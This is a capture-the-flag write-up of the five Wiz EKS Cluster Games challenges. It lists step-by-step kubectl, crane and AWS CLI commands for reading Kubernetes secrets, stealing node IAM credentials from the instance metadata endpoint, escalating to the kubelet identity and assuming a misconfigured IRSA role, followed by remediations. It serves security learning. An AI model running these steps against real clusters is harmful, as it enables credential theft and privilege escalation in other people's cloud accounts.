# Wiz EKS Cluster Games: CTF Findings Report
**Author:** xSnaeRx  
**Date:** May 27, 2026  
**Lab Environment:** Wiz EKS Cluster Games (https://eksclustergames.com)  
**Format:** Capture The Flag (CTF) — 5 Challenges  

---

## Executive Summary

The Wiz EKS Cluster Games is a real-world Kubernetes and AWS security CTF hosted by Wiz. All 5 challenges were completed, covering a range of attack techniques including RBAC enumeration, container image analysis, AWS IMDS credential theft, Kubernetes node identity escalation, and IRSA misconfiguration exploitation. Each challenge simulates a realistic misconfiguration found in production EKS environments.

---

## Challenge 1 — Secret Seeker

**Category:** RBAC / Kubernetes Secrets  
**Difficulty:** Easy  

### Description
The first challenge involved enumerating available permissions within the cluster and leveraging them to extract a secret directly from the Kubernetes secrets store.

### Methodology

**Step 1 — Enumerate available permissions:**
```bash
kubectl auth can-i --list
```

**Step 2 — List secrets in the namespace:**
```bash
kubectl get secrets
```

**Step 3 — Extract and decode the secret:**
```bash
kubectl get secret <secret-name> -o yaml
echo "<base64-value>" | base64 -d
```

### Key Takeaway
> Service accounts and users should only be granted the minimum permissions required. Unrestricted access to list and read secrets can expose sensitive credentials to anyone who gains pod access.

---

## Challenge 2 — Registry Hunt

**Category:** Container Registry / Docker Credentials  
**Difficulty:** Easy-Medium  

### Description
This challenge demonstrated how Docker registry credentials stored as Kubernetes image pull secrets can be extracted and used to authenticate to a private container registry, revealing secrets embedded in container images.

### Methodology

**Step 1 — Identify the image pull secret from the pod spec:**
```bash
kubectl get pod <pod-name> -o yaml
# Revealed imagePullSecrets: registry-pull-secrets-780bab1d
```

**Step 2 — Read the secret directly by name:**
```bash
kubectl get secret registry-pull-secrets-780bab1d -o yaml
```

**Step 3 — Decode the Docker credentials:**
```bash
echo "<base64-value>" | base64 -d
# Returns: eksclustergames:<docker-token>
```

**Step 4 — Authenticate to Docker Hub using crane:**
```bash
crane auth login docker.io -u eksclustergames -p <token>
```

**Step 5 — Inspect the image config for the flag:**
```bash
crane config eksclustergames/base_ext_image:latest | jq
```

### Key Takeaway
> Even without permission to list secrets, knowing a secret's name (discoverable from pod specs) is enough to read it directly. Image pull secrets should follow least privilege and be scoped to specific namespaces.

---

## Challenge 3 — Image Inquisition

**Category:** Container Image Analysis / AWS IMDS  
**Difficulty:** Medium  

### Description
This challenge combined two attack techniques: stealing AWS credentials from the Instance Metadata Service (IMDS) from within a pod, then using those credentials to authenticate to a private ECR registry and extract a flag hidden in the container image build history.

### Methodology

**Step 1 — Steal AWS credentials from IMDS:**
```bash
curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
```

**Step 2 — Export the credentials:**
```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<SessionToken>"
```

**Step 3 — Identify the ECR image from the pod spec:**
```bash
kubectl get pods -o json | jq -r '.items[].spec.containers[].image'
# 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:...
```

**Step 4 — Authenticate crane to ECR:**
```bash
aws ecr get-login-password --region us-west-1 | \
  crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin
```

**Step 5 — Inspect image build history for the flag:**
```bash
crane config <image> | jq '.history'
```

### Flag
`wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}`

### Key Takeaway
> Secrets passed as build arguments or environment variables during image construction are permanently recorded in the image history. Additionally, EKS clusters without IMDSv2 hop limit enforcement allow pods to steal node IAM credentials via IMDS.

---

## Challenge 4 — Pod Break

**Category:** AWS IAM / Kubernetes Node Identity Escalation  
**Difficulty:** Medium-Hard  

### Description
This challenge demonstrated how the AWS node IAM role credentials (obtained via IMDS) can be used to generate a Kubernetes token as the node/kubelet identity, which carries significantly more privileges than a standard pod service account.

### Methodology

**Step 1 — Confirm AWS credentials from IMDS:**
```bash
aws sts get-caller-identity
# Returns: eks-challenge-cluster-nodegroup-NodeInstanceRole
```

**Step 2 — Generate a Kubernetes token using the node IAM role:**
```bash
TOKEN="$(aws eks get-token --cluster-name eks-challenge-cluster | jq -r .status.token)"
```

**Step 3 — Verify the node identity:**
```bash
kubectl whoami --token "$TOKEN"
# system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal
```

**Step 4 — Check elevated permissions:**
```bash
kubectl auth can-i --list --token "$TOKEN"
```

**Step 5 — Read secrets using the node identity:**
```bash
kubectl get secrets --token "$TOKEN" -o yaml
```

### Key Takeaway
> The kubelet (node) identity has elevated permissions to read secrets for pods scheduled on that node. IMDS access from within a pod allows escalation from a low-privileged service account to the much more powerful node identity — a critical misconfiguration in EKS clusters without IMDSv2 enforcement.

---

## Challenge 5 — Container Secrets Infrastructure

**Category:** AWS IRSA / IAM Role Assumption  
**Difficulty:** Hard  

### Description
The final challenge involved exploiting a misconfigured IRSA (IAM Roles for Service Accounts) trust policy to assume an AWS IAM role with S3 access, then retrieving a flag from a private S3 bucket.

### Methodology

**Step 1 — Identify the IAM role ARN from service account annotations:**
```bash
kubectl get sa s3access-sa -o json | jq .metadata.annotations
# eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
```

**Step 2 — Generate a token for the accessible service account:**
```bash
TOKEN=$(kubectl create token debug-sa --duration 3h --audience sts.amazonaws.com)
```

**Step 3 — Assume the S3 role via web identity:**
```bash
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::688655246681:role/challengeEksS3Role" --role-session-name "exploit" --web-identity-token "$TOKEN" --region us-west-1
```

**Step 4 — Export the returned credentials:**
```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<SessionToken>"
```

**Step 5 — Retrieve the flag from S3:**
```bash
aws s3 ls s3://challenge-flag-bucket-3ff1ae2/
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
cat flag
```

### Key Takeaway
> IRSA trust policies that allow any service account in a namespace (rather than a specific one) enable privilege escalation. An attacker with the ability to create tokens for any service account can assume powerful IAM roles, potentially leading to full AWS account compromise.

---

## Attack Surface Summary

| Challenge | Technique | AWS/K8s Component |
|---|---|---|
| 1 — Secret Seeker | RBAC enumeration | Kubernetes Secrets |
| 2 — Registry Hunt | Image pull secret extraction | Docker Registry / ECR |
| 3 — Image Inquisition | IMDS credential theft + image history | AWS IMDS / ECR |
| 4 — Pod Break | Node identity escalation | AWS EKS / kubelet |
| 5 — Container Secrets Infrastructure | IRSA misconfiguration | AWS IAM / S3 |

---

## Key Remediations

| Finding | Remediation |
|---|---|
| Unrestricted secret access | Apply least privilege RBAC roles |
| Image pull secrets readable by name | Scope secrets to specific service accounts |
| IMDS accessible from pods | Enforce IMDSv2 with hop limit of 1 |
| Secrets in image build history | Use `--mount=type=secret` in Dockerfile |
| Overly broad IRSA trust policy | Scope trust policy to specific service account |
| Node identity accessible via IMDS | Restrict pod IMDS access via network policy |

---

## References

- [Wiz EKS Cluster Games](https://eksclustergames.com)
- [AWS IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [AWS IRSA Documentation](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- [MITRE ATT&CK - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [MITRE ATT&CK - Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)
